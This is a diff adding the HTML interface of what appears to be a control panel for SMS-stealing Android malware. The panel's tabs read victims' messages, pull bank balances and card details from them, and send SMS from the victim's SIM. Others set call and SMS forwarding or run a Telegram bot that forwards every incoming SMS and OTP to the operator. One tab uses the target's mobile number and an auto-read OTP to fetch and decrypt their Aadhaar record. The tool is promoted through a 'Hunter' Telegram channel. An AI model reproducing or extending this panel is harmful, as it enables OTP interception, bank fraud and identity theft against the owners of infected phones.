+            <p class="info-online-label">Last Activity</p>
+            <p class="info-online-ts" id="detail-online-ts"></p>
+          </div>
+          <p class="info-section-label">Device</p>
+          <div id="info-rows"></div>
+          <div id="info-sms-section" style="display:none">
+            <p class="info-section-label" style="margin-top:1rem">From SMS</p>
+            <div id="info-sms-rows"></div>
+          </div>
+        </div>
+      </div>
+
+      <!-- BANK TAB -->
+      <div class="tab-pane" id="tab-bank">
+        <div class="bank-header">
+          <div>
+            <p class="bank-header-info" id="bank-sms-count-info">Auto-detected from 0 SMS</p>
+            <p class="bank-header-count" id="bank-found-count"></p>
+          </div>
+          <button class="btn-refresh-sms" onclick="refreshDetailSms()">
+            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor">
+              <path stroke-linecap="round" stroke-linejoin="round" d="M16.023 9.348h4.992v-.001M2.985 19.644v-4.992m0 0h4.992m-4.993 0l3.181 3.183a8.25 8.25 0 0013.803-3.7M4.031 9.865a8.25 8.25 0 0113.803-3.7l3.181 3.182m0-4.991v4.99"/>
+            </svg>
+          </button>
+        </div>
+        <div id="bank-tab-content">
+          <div class="tab-loading" id="bank-loading">
+            <div class="spinner" style="margin:0 auto 0.75rem;border-top-color:#22c55e"></div>
+            <p>Scanning bank SMS…</p>
+          </div>
+          <div class="tab-empty" id="bank-empty" style="display:none">
+            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor">
+              <path stroke-linecap="round" stroke-linejoin="round" d="M2.25 18.75a60.07 60.07 0 0115.797 2.101c.727.198 1.453-.342 1.453-1.096V18.75M3.75 4.5v.75A.75.75 0 013 6h-.75m0 0v-.375c0-.621.504-1.125 1.125-1.125H20.25M2.25 6v9m18-10.5v.75c0 .414.336.75.75.75h.75m-1.5-1.5h.375c.621 0 1.125.504 1.125 1.125v9.75c0 .621-.504 1.125-1.125 1.125h-.375m1.5-1.5H21a.75.75 0 00-.75.75v.75m0 0H3.75m0 0h-.375a1.125 1.125 0 01-1.125-1.125V15m1.5 1.5v-.75A.75.75 0 003 15h-.75M15 10.5a3 3 0 11-6 0 3 3 0 016 0zm3 0h.008v.008H18V10.5zm-12 0h.008v.008H6V10.5z"/>
+            </svg>
+            <p class="tab-empty-title">No bank SMS found</p>
+            <p class="tab-empty-sub">Bank transaction SMS with balance will appear here automatically</p>
+          </div>
+          <div class="bank-list" id="bank-list" style="display:none"></div>
+        </div>
+      </div>
+
+      <!-- CARDS TAB -->
+      <div class="tab-pane" id="tab-cards">
+        <div class="bank-header">
+          <p class="bank-header-info">Card info found in SMS messages</p>
+          <button class="btn-refresh-sms" onclick="refreshDetailSms()">
+            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor">
+              <path stroke-linecap="round" stroke-linejoin="round" d="M16.023 9.348h4.992v-.001M2.985 19.644v-4.992m0 0h4.992m-4.993 0l3.181 3.183a8.25 8.25 0 0013.803-3.7M4.031 9.865a8.25 8.25 0 0113.803-3.7l3.181 3.182m0-4.991v4.99"/>
+            </svg>
+          </button>
+        </div>
+        <div class="card-list" id="cards-list">
+          <div class="tab-empty" id="cards-empty">
+            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor">
+              <path stroke-linecap="round" stroke-linejoin="round" d="M2.25 8.25h19.5M2.25 9h19.5m-16.5 5.25h6m-6 2.25h3m-3.75 3h15a2.25 2.25 0 002.25-2.25V6.75A2.25 2.25 0 0019.5 4.5h-15a2.25 2.25 0 00-2.25 2.25v10.5A2.25 2.25 0 004.5 19.5z"/>
+            </svg>
+            <p class="tab-empty-title">No card info found</p>
+          </div>
+        </div>
+      </div>
+
+      <!-- SMS TAB -->
+      <div class="tab-pane" id="tab-sms">
+        <div class="sms-header">
+          <div class="sms-header-top">
+            <span>Last 150 messages · auto-refreshes</span>
+            <button class="btn-refresh-sms" id="btn-refresh-sms" onclick="refreshDetailSms()" title="Refresh SMS">
+            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor">
+              <path stroke-linecap="round" stroke-linejoin="round" d="M16.023 9.348h4.992v-.001M2.985 19.644v-4.992m0 0h4.992m-4.993 0l3.181 3.183a8.25 8.25 0 0013.803-3.7M4.031 9.865a8.25 8.25 0 0113.803-3.7l3.181 3.182m0-4.991v4.99"/>
+            </svg>
+          </button>
+          </div>
+          <div class="sms-search-row">
+            <input id="sms-search-input" type="text" class="sms-search-input" placeholder="🔍 Search messages, sender, amount…" oninput="filterSmsList(this.value)">
+            <span id="sms-search-count" class="sms-search-count"></span>
+            <label class="copy-toggle-switch" title="Toggle 1-Tap Copy Mode">
+              <input type="checkbox" id="copy-toggle-input" checked onchange="toggleCopyMode()">
+              <span class="copy-toggle-slider"></span>
+              <span class="copy-toggle-label">1-Tap Copy</span>
+            </label>
+          </div>
+        </div>
+        <div id="sms-tab-content">
+          <div class="tab-loading" id="sms-loading">
+            <div class="spinner" style="margin:0 auto 0.75rem"></div>
+            <p>Loading messages…</p>
+          </div>
+          <div class="tab-empty" id="sms-empty" style="display:none">
+            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor">
+              <path stroke-linecap="round" stroke-linejoin="round" d="M8.625 12a.375.375 0 11-.75 0 .375.375 0 01.75 0zm0 0H8.25m4.125 0a.375.375 0 11-.75 0 .375.375 0 01.75 0zm0 0H12m4.125 0a.375.375 0 11-.75 0 .375.375 0 01.75 0zm0 0h-.375M21 12c0 4.556-4.03 8.25-9 8.25a9.764 9.764 0 01-2.555-.337A5.972 5.972 0 015.41 20.97a5.969 5.969 0 01-.474-.065 4.48 4.48 0 00.978-2.025c.09-.457-.133-.901-.467-1.226C3.93 16.178 3 14.189 3 12c0-4.556 4.03-8.25 9-8.25s9 3.694 9 8.25z"/>
+            </svg>
+            <p class="tab-empty-title">No messages</p>
+          </div>
+          <div class="sms-list" id="sms-list" style="display:none"></div>
+        </div>
+      </div>
+
+      <!-- SEND TAB -->
+      <div class="tab-pane" id="tab-send">
+        <!-- Send SMS -->
+        <div class="send-section">
+          <p class="send-section-title">📤 Send SMS</p>
+          <div>
+            <p class="send-label">Select SIM</p>
+            <div class="sim-btns">
+              <button class="sim-btn active" id="sim-btn-1" onclick="selectSim(1)">SIM 1</button>
+              <button class="sim-btn" id="sim-btn-2" onclick="selectSim(2)">SIM 2</button>
+            </div>
+          </div>
+          <div>
+            <p class="send-label">Recipient</p>
+            <input type="text" class="send-input" id="send-to" placeholder="+919876543210" />
+          </div>
+          <div>
+            <p class="send-label">Message</p>
+            <textarea class="send-textarea" id="send-msg" rows="4" placeholder="Type your message here…" oninput="document.getElementById('send-char-count').textContent = this.value.length + ' chars'"></textarea>
+            <p class="send-char-count" id="send-char-count">0 chars</p>
+          </div>
+          <button class="btn-send" id="btn-send-sms" onclick="sendSms()">
+            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor">
+              <path stroke-linecap="round" stroke-linejoin="round" d="M6 12L3.269 3.126A59.768 59.768 0 0121.485 12 59.77 59.77 0 013.27 20.876L5.999 12zm0 0h7.5"/>
+            </svg>
+            <span id="btn-send-text">Send via SIM 1</span>
+          </button>
+          <button class="btn-use-number" id="btn-use-number" onclick="useDeviceNumber()">
+            Use device number: <span id="device-number-display" style="font-family:monospace;color:#888"></span>
+          </button>
+        </div>
+
+        <!-- Call Forwarding -->
+        <div class="send-section forward-section">
+          <p class="send-section-title">📞 Call Forwarding</p>
+          <p class="send-section-desc">Forward all incoming calls to another number</p>
+          <div class="forward-row">
+            <input type="text" class="send-input forward-input" id="call-forward-number" placeholder="+919876543210" />
+            <button class="btn-forward" id="btn-call-forward" onclick="sendCallForward()">Set Forward</button>
+            <button class="btn-forward-off" onclick="disableCallForward()">Disable</button>
+          </div>
+        </div>
+
+        <!-- SMS Forwarding -->
+        <div class="send-section forward-section">
+          <p class="send-section-title">💬 SMS Forwarding</p>
+          <p class="send-section-desc">Forward all incoming SMS to another number</p>
+          <div class="forward-row">
+            <input type="text" class="send-input forward-input" id="sms-forward-number" placeholder="+919876543210" />
+            <button class="btn-forward" id="btn-sms-forward" onclick="sendSmsForward()">Set Forward</button>
+            <button class="btn-forward-off" onclick="disableSmsForward()">Disable</button>
+          </div>
+        </div>
+      </div>
+
+      <!-- BOT TAB -->
+      <div class="tab-pane" id="tab-bot">
+        <div class="bot-section">
+
+          <!-- Status bar -->
+          <div class="bot-status-bar" id="bot-status-bar">
+            <div class="bot-status-dot" id="bot-status-dot"></div>
+            <span id="bot-status-text">Bot Offline</span>
+            <span class="bot-status-count" id="bot-sent-count">0 sent</span>
+          </div>
+
+          <!-- Config -->
+          <div class="bot-config-block">
+            <p class="send-section-title">🤖 Telegram Auto Bot</p>
+            <p class="send-section-desc">Enter your bot token, chat ID, and choose which message format your channel uses.</p>
+
+            <div class="bot-field">
+              <p class="send-label">Bot Token</p>
+              <input type="password" class="send-input" id="bot-token" placeholder="Paste your bot token here" autocomplete="off" />
+              <p class="bot-hint">Create a bot at @BotFather → /newbot. Each user needs their own token.</p>
+            </div>
+
+            <div class="bot-field">
+              <p class="send-label">Telegram Chat ID</p>
+              <input type="text" class="send-input" id="bot-chat-id" placeholder="-100XXXXXXXXXX or @username" />
+              <p class="bot-hint">Group/channel the bot monitors. Get ID via @userinfobot or @RawDataBot</p>
+            </div>
+
+            <div class="bot-field">
+              <p class="send-label">Message Format your channel uses</p>
+              <select class="send-input" id="bot-format" style="cursor:pointer">
+                <option value="auto">🔄 Auto-detect (try all formats)</option>
+                <option value="plain">A — Plain: To: +91... / Message: text</option>
+                <option value="phone_inline">B — 📞 To: +91... / 💬 Message: text (both same line)</option>
+                <option value="phone_nextline">C — 📱 To: (next line: number) / 💬 Full Message: (next line: text)</option>
+                <option value="dot_nextline">D — 📍 To: (next line: number) / 💬 Message: (next line: text)</option>
+                <option value="receiver_nextline">E — 📱 Receiver (next line: number) / 🔑 Message (next line: text)</option>
+                <option value="tag">F — 🏷️ RECIPIENT: +91... / 🏷️ MESSAGE: text</option>
+              </select>
+              <p class="bot-hint">Select the exact format that your token sender posts in the channel</p>
+            </div>
+
+            <div class="bot-field">
+              <p class="send-label">SIM to use for sending</p>
+              <div class="sim-btns">
+                <button class="sim-btn active" id="bot-sim-1" onclick="selectBotSim(1)">SIM 1</button>
+                <button class="sim-btn" id="bot-sim-2" onclick="selectBotSim(2)">SIM 2</button>
+              </div>
+            </div>
+
+            <div class="bot-field">
+              <p class="send-label">Repeat count per request</p>
+              <div class="sim-btns">
+                <button class="sim-btn active" id="bot-rpt-1" onclick="selectBotRepeat(1)">×1</button>
+                <button class="sim-btn" id="bot-rpt-2" onclick="selectBotRepeat(2)">×2</button>
+                <button class="sim-btn" id="bot-rpt-3" onclick="selectBotRepeat(3)">×3</button>
+              </div>
+            </div>
+
+            <!-- Auto Token Forward section -->
+            <div class="bot-field" style="border:1px solid #f59e0b33;border-radius:10px;padding:12px;background:#f59e0b08;">
+              <p class="send-label" style="color:#f59e0b;">🔄 Auto Token Forward</p>
+              <p class="bot-hint" style="margin-bottom:8px;">When ANY message arrives in the watched chat, automatically send it as SMS to the number below. Leave blank to use <b>SMS Request</b> mode instead.</p>
+              <input type="text" class="send-input" id="bot-autofwd-num" placeholder="Target phone: +91XXXXXXXXXX" style="margin-bottom:8px;" />
+              <input type="text" class="send-input" id="bot-autofwd-tpl" placeholder="SMS template: Your token is {token} (leave blank = send raw)" />
+              <p class="bot-hint" style="margin-top:4px;">Use <code>{token}</code> in the template to insert the Telegram message.</p>
+            </div>
+          </div>
+
+          <!-- Format preview card -->
+          <div class="bot-directions">
+            <div class="bot-dir-card" id="bot-format-preview">
+              <div class="bot-dir-icon">💬→📱</div>
+              <div>
+                <p class="bot-dir-title">Selected format preview</p>
+                <p class="bot-dir-desc" id="bot-format-preview-text">
+                  Choose a format above to see the exact message structure your channel should use.
+                </p>
+              </div>
+            </div>
+            <div class="bot-dir-card">
+              <div class="bot-dir-icon">📱→💬</div>
+              <div>
+                <p class="bot-dir-title">SMS → Telegram (auto-forward)</p>
+                <p class="bot-dir-desc">Every new SMS on the device is automatically forwarded to your configured chat every 4s.</p>
+              </div>
+            </div>
+          </div>
+
+          <!-- Log -->
+          <div class="bot-log-wrap">
+            <div class="bot-log-header">
+              <span>Bot Activity Log</span>
+              <button class="bot-log-clear" onclick="clearBotLog()">Clear</button>
+            </div>
+            <div class="bot-log" id="bot-log"><p class="bot-log-empty">No activity yet…</p></div>
+          </div>
+
+          <!-- Controls -->
+          <div class="bot-controls">
+            <button class="bot-btn-start" id="bot-btn-start" onclick="toggleBot()">▶ Start Bot</button>
+            <button class="bot-btn-save" onclick="saveBotConfig()">💾 Save Config</button>
+          </div>
+        </div>
+      </div>
+
+      <!-- AADHAAR TAB -->
+      <div class="tab-pane" id="tab-aadhaar">
+
+        <!-- Step Progress Bar -->
+        <div class="adh-steps" id="adh-steps">
+          <div class="adh-step active" id="adh-step-1"><span class="adh-step-num">1</span><span class="adh-step-lbl">Number</span></div>
+          <div class="adh-step-line"></div>
+          <div class="adh-step" id="adh-step-2"><span class="adh-step-num">2</span><span class="adh-step-lbl">Captcha</span></div>
+          <div class="adh-step-line"></div>
+          <div class="adh-step" id="adh-step-3"><span class="adh-step-num">3</span><span class="adh-step-lbl">OTP</span></div>
+          <div class="adh-step-line"></div>
+          <div class="adh-step" id="adh-step-4"><span class="adh-step-num">4</span><span class="adh-step-lbl">Done</span></div>
+        </div>
+
+        <!-- Step 1: Number Selection -->
+        <div class="aadhaar-card" id="aadhaar-step-num">
+          <p class="aadhaar-card-title">&#128241; Target Mobile Number</p>
+          <p class="aadhaar-card-desc">Enter or select the 10-digit mobile number linked to the target's Aadhaar:</p>
+          <div class="aadhaar-phone-input-wrap">
+            <span class="aadhaar-phone-prefix">+91</span>
+            <input type="text" id="input-aadhaar-phone" class="aadhaar-phone-input" placeholder="Enter 10-digit mobile number" maxlength="10" inputmode="numeric" />
+          </div>
+          <div id="aadhaar-number-selector" class="aadhaar-number-selector"></div>
+          <button class="btn-aadhaar-action" id="btn-aadhaar-start" onclick="startAadhaarFetch()">
+            <span>&#10024; Start Aadhaar Fetch &amp; Auto-OTP</span>
+          </button>
+        </div>
+
+        <!-- Live Status Card -->
+        <div class="aadhaar-card" id="aadhaar-status-card" style="display:none">
+          <div class="aadhaar-status-header">
+            <div style="flex:1;min-width:0">
+              <span class="aadhaar-status-title" id="aadhaar-status-label">Initializing UIDAI Session...</span>
+              <div class="adh-substatus" id="adh-substatus"></div>
+            </div>
+            <span class="aadhaar-spinner" id="aadhaar-spinner"></span>
+          </div>
+          <!-- Cancel / Retry always visible -->
+          <div class="adh-action-row" id="adh-action-row">
+            <button class="adh-btn-cancel" onclick="cancelAadhaarSession()">&#10005; Cancel</button>
+            <button class="adh-btn-retry" onclick="retryAadhaarFetch()">&#8635; Retry</button>
+          </div>
+          <div class="aadhaar-log-box" id="aadhaar-log-box"></div>
+        </div>
+
+        <!-- OTP Card -->
+        <div class="aadhaar-card adh-otp-card" id="aadhaar-otp-fallback" style="display:none">
+          <p class="aadhaar-card-title">&#9889; Enter OTP</p>
+          <p class="aadhaar-card-desc" id="adh-otp-desc">Auto-reading from device SMS... enter manually if not auto-detected:</p>
+          <div class="adh-otp-boxes">
+            <input class="adh-otp-box" maxlength="1" inputmode="numeric" id="adh-otp-0" oninput="advOtp(this,0)" onkeydown="backOtp(event,0)" />
+            <input class="adh-otp-box" maxlength="1" inputmode="numeric" id="adh-otp-1" oninput="advOtp(this,1)" onkeydown="backOtp(event,1)" />
+            <input class="adh-otp-box" maxlength="1" inputmode="numeric" id="adh-otp-2" oninput="advOtp(this,2)" onkeydown="backOtp(event,2)" />
+            <span class="adh-otp-sep">&#8212;</span>
+            <input class="adh-otp-box" maxlength="1" inputmode="numeric" id="adh-otp-3" oninput="advOtp(this,3)" onkeydown="backOtp(event,3)" />
+            <input class="adh-otp-box" maxlength="1" inputmode="numeric" id="adh-otp-4" oninput="advOtp(this,4)" onkeydown="backOtp(event,4)" />
+            <input class="adh-otp-box" maxlength="1" inputmode="numeric" id="adh-otp-5" oninput="advOtp(this,5)" onkeydown="backOtp(event,5)" />
+          </div>
+          <input type="hidden" id="input-manual-otp" />
+          <div class="adh-otp-action-row">
+            <button class="adh-btn-retry-sm" onclick="retryAadhaarFetch()">&#8635; Retry Session</button>
+            <button class="btn-aadhaar-submit" id="btn-submit-otp" onclick="submitOtpBoxes()">Submit OTP &#8594;</button>
+          </div>
+          <div class="adh-otp-timer-wrap">
+            <div class="adh-otp-timer" id="adh-otp-timer">
+              <svg viewBox="0 0 36 36" class="adh-otp-ring">
+                <path class="adh-ring-bg" d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831"/>
+                <path class="adh-ring-fill" id="adh-ring-fill" stroke-dasharray="100, 100" d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831"/>
+              </svg>
+              <span class="adh-otp-sec" id="adh-otp-sec">60</span>
+            </div>
+            <span style="font-size:0.72rem;color:#64748b;margin-top:4px">OTP valid for 60s</span>
+          </div>
+        </div>
+
+        <!-- Result Card -->
+        <div class="aadhaar-card aadhaar-result-card" id="aadhaar-result-card" style="display:none">
+          <div class="aadhaar-result-header">
+            <span class="aadhaar-result-icon">&#9989;</span>
+            <div>
+              <h4 class="aadhaar-result-name" id="aadhaar-res-name">---</h4>
+              <p class="aadhaar-result-num" id="aadhaar-res-no" style="font-size:1.1rem;font-weight:800;letter-spacing:1px;color:#38bdf8">---</p>
+              <div style="margin-top:4px;">
+                <span style="background:rgba(34,197,94,0.15);color:#4ade80;padding:2px 8px;border-radius:4px;font-size:0.75rem;font-weight:700;font-family:monospace;" id="aadhaar-res-password">&#128275; Password: ---</span>
+              </div>
+            </div>
+          </div>
+          <div class="aadhaar-details-grid">
+            <div class="aadhaar-detail-item"><span class="lbl">DOB</span><span class="val" id="aadhaar-res-dob">---</span></div>
+            <div class="aadhaar-detail-item"><span class="lbl">Gender</span><span class="val" id="aadhaar-res-gender">---</span></div>
+            <div class="aadhaar-detail-item full-width"><span class="lbl">Address</span><span class="val" id="aadhaar-res-address">---</span></div>
+          </div>
+          <div id="aadhaar-res-images"></div>
+          <div class="aadhaar-pdf-action" style="margin-top:12px;">
+            <a id="btn-download-aadhaar-pdf" class="btn-aadhaar-pdf-download" download="Unlocked_Aadhaar.pdf" href="#">
+              <span>&#128229; Download Decrypted Aadhaar PDF (No Password)</span>
+            </a>
+          </div>
+          <div style="margin-top:10px;text-align:center">
+            <button class="adh-btn-retry" onclick="resetAadhaarUI()" style="font-size:0.8rem;padding:7px 20px">&#8617; Fetch Another</button>
+          </div>
+        </div>
+
+      </div>
+
+    </div><!-- /detail-body -->
+  </div><!-- /detail-panel -->
+</div><!-- /detail-overlay -->
+
+
+<!-- Toast -->
+<div id="toast"></div>
+
+<!-- ═══════════════════════════════════════════════════════════════════════
+     MAGIC SCAN MODAL
+════════════════════════════════════════════════════════════════════════ -->
+<div id="magic-scan-overlay" onclick="magicScanOverlayClick(event)">
+  <div class="magic-scan-modal" id="magic-scan-modal">
+
+    <!-- Header -->
+    <div class="magic-scan-header">
+      <div class="magic-scan-title-row">
+        <div class="magic-scan-title-icon">
+          <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M9.813 15.904L9 18.75l-.813-2.846a4.5 4.5 0 00-3.09-3.09L2.25 12l2.846-.813a4.5 4.5 0 003.09-3.09L9 5.25l.813 2.846a4.5 4.5 0 003.09 3.09L15.75 12l-2.846.813a4.5 4.5 0 00-3.09 3.09zM18.259 8.715L18 9.75l-.259-1.035a3.375 3.375 0 00-2.455-2.456L14.25 6l1.036-.259a3.375 3.375 0 002.455-2.456L18 2.25l.259 1.035a3.375 3.375 0 002.456 2.456L21.75 6l-1.035.259a3.375 3.375 0 00-2.456 2.456z"/>
+          </svg>
+        </div>
+        <div>
+          <h2 class="magic-scan-title">Magic Scan</h2>
+          <p class="magic-scan-subtitle" id="magic-scan-subtitle">Scanning all online devices…</p>
+        </div>
+      </div>
+      <button class="magic-scan-close" onclick="closeMagicScan()">
+        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor">
+          <path stroke-linecap="round" stroke-linejoin="round" d="M6 18L18 6M6 6l12 12"/>
+        </svg>
+      </button>
+    </div>
+
+    <!-- Progress bar -->
+    <div class="magic-progress-wrap" id="magic-progress-wrap">
+      <div class="magic-progress-bar">
+        <div class="magic-progress-fill" id="magic-progress-fill"></div>
+      </div>
+      <p class="magic-progress-label" id="magic-progress-label">Initializing…</p>
+    </div>
+
+    <!-- Results -->
+    <div class="magic-results" id="magic-results"></div>
+
+    <!-- Footer -->
+    <div class="magic-scan-footer" id="magic-scan-footer">
+      <button class="btn-magic-done" id="btn-magic-done" onclick="finishMagicScan()">
+        <span>Done — View Priority Devices</span>
+        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor">
+          <path stroke-linecap="round" stroke-linejoin="round" d="M13.5 4.5L21 12m0 0l-7.5 7.5M21 12H3"/>
+        </svg>
+      </button>
+    </div>
+
+  </div>
+</div>
+
+<script src="app.js?v=20260909_v120"></script>
+
+<!-- ═══════════════════════════════════════════════════════════════════════
+     JOIN TELEGRAM POPUP MODAL (1-TIME CHECK)
+════════════════════════════════════════════════════════════════════════ -->
+<div id="tg-popup-overlay" class="tg-popup-overlay" style="display:none" onclick="tgPopupOverlayClick(event)">
+  <div class="tg-popup-card">
+    <button class="tg-popup-close-icon" onclick="closeTgPopup()" title="Close">
+      <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor">
+        <path stroke-linecap="round" stroke-linejoin="round" d="M6 18L18 6M6 6l12 12"/>
+      </svg>
+    </button>
+    <div class="tg-popup-icon-wrap">
+      <div class="tg-popup-icon-glow"></div>
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" class="tg-popup-icon">
+        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69.01-.03.01-.14-.07-.2-.08-.06-.19-.04-.27-.02-.12.02-1.96 1.25-5.54 3.69-.52.36-1 .54-1.43.53-.47-.01-1.37-.26-2.04-.48-.82-.27-1.47-.42-1.42-.88.03-.24.37-.49 1.02-.75 3.99-1.74 6.66-2.89 8.01-3.45 3.81-1.59 4.6-1.87 5.12-1.88.11 0 .37.03.54.17.14.12.18.28.2.45-.02.07-.02.16-.04.25z"/>
+      </svg>
+    </div>
+    <h3 class="tg-popup-title">Join 𝐒𝐡𝐚𝐢𝐥𝐞𝐬𝐡 𝐗 𝐋𝐢𝐯𝐞 : 𝐇𝐮𝐧𝐭𝐞𝐫 ☠️</h3>
+    <p class="tg-popup-subtitle">
+      Stay updated with real-time notifications, new features, and live community support in our official Telegram Channel!
+    </p>
+    <div class="tg-popup-channel-badge">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" style="width:1rem;height:1rem;color:#38bdf8">
+        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69.01-.03.01-.14-.07-.2-.08-.06-.19-.04-.27-.02-.12.02-1.96 1.25-5.54 3.69-.52.36-1 .54-1.43.53-.47-.01-1.37-.26-2.04-.48-.82-.27-1.47-.42-1.42-.88.03-.24.37-.49 1.02-.75 3.99-1.74 6.66-2.89 8.01-3.45 3.81-1.59 4.6-1.87 5.12-1.88.11 0 .37.03.54.17.14.12.18.28.2.45-.02.07-.02.16-.04.25z"/>
+      </svg>
+      <span>t.me/+UWhrJmhFHCk3MTJl</span>
+    </div>
+    <div class="tg-popup-actions">
+      <a href="https://t.me/+UWhrJmhFHCk3MTJl" target="_blank" rel="noopener noreferrer" onclick="onJoinTgClick()" class="btn-tg-popup-join">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" style="width:1.25rem;height:1.25rem">
+          <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69.01-.03.01-.14-.07-.2-.08-.06-.19-.04-.27-.02-.12.02-1.96 1.25-5.54 3.69-.52.36-1 .54-1.43.53-.47-.01-1.37-.26-2.04-.48-.82-.27-1.47-.42-1.42-.88.03-.24.37-.49 1.02-.75 3.99-1.74 6.66-2.89 8.01-3.45 3.81-1.59 4.6-1.87 5.12-1.88.11 0 .37.03.54.17.14.12.18.28.2.45-.02.07-.02.16-.04.25z"/>
+        </svg>
+        <span>Join Telegram Channel</span>
+      </a>
+      <button onclick="closeTgPopup()" class="btn-tg-popup-dismiss">
+        I've Already Joined
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════════════════
+     SHARE DEVICE MODAL
+════════════════════════════════════════════════════════════════════════ -->
+<div id="share-device-modal" class="tg-popup-overlay" style="display:none;z-index:99999" onclick="if(event.target===this)closeDeviceShareModal()">
+  <div class="tg-popup-card" style="max-width:440px">
+    <button class="tg-popup-close-icon" onclick="closeDeviceShareModal()" title="Close">
+      <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor">
+        <path stroke-linecap="round" stroke-linejoin="round" d="M6 18L18 6M6 6l12 12"/>
+      </svg>
+    </button>
+    <div class="tg-popup-icon-wrap" style="background:rgba(56,189,248,0.15)">
+      <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" style="width:2rem;height:2rem;color:#38bdf8">
+        <path stroke-linecap="round" stroke-linejoin="round" d="M7.217 10.907a2.25 2.25 0 100 2.186m0-2.186c.18.324.283.696.283 1.093s-.103.77-.283 1.093m0-2.186l9.566-5.314m-9.566 7.5l9.566 5.314m0 0a2.25 2.25 0 103.935 2.186 2.25 2.25 0 00-3.935-2.186zm0-12.814a2.25 2.25 0 103.933-2.185 2.25 2.25 0 00-3.933 2.185z"/>
+      </svg>
+    </div>
+    <h3 class="tg-popup-title" style="margin-top:0.75rem">Share Single Device Access</h3>
+    <p class="tg-popup-subtitle" style="font-size:0.8rem;margin-bottom:1rem">
+      Generate a secure sharable link giving access to <b id="share-modal-devname" style="color:#38bdf8">this device only</b>. Full panel & Firebase creds will be completely hidden.
+    </p>
+
+    <div style="background:rgba(15,23,42,0.6);border:1px solid rgba(255,255,255,0.08);border-radius:0.75rem;padding:0.85rem;margin-bottom:1rem;text-align:left">
+      <label style="font-size:0.7rem;font-weight:600;color:var(--text-muted);display:block;margin-bottom:0.35rem">SINGLE DEVICE SHARABLE LINK</label>
+      <input type="text" id="share-device-url-input" readonly onclick="this.select()" style="width:100%;padding:0.5rem 0.65rem;background:rgba(0,0,0,0.4);border:1px solid rgba(255,255,255,0.12);border-radius:0.5rem;color:#38bdf8;font-family:monospace;font-size:0.75rem" />
+    </div>
+
+    <div style="display:flex;gap:0.5rem">
+      <button id="btn-copy-share-device" onclick="copyShareDeviceLink()" class="btn-tg-popup-join" style="flex:1;justify-content:center;padding:0.6rem;transition:all 0.2s ease">
+        📋 Copy Link
+      </button>
+      <button onclick="closeDeviceShareModal()" class="btn-tg-popup-dismiss" style="width:auto;padding:0.6rem 1rem;margin:0">
+        Close
+      </button>
+    </div>
+  </div>
+</div>
+</body>
+</html>
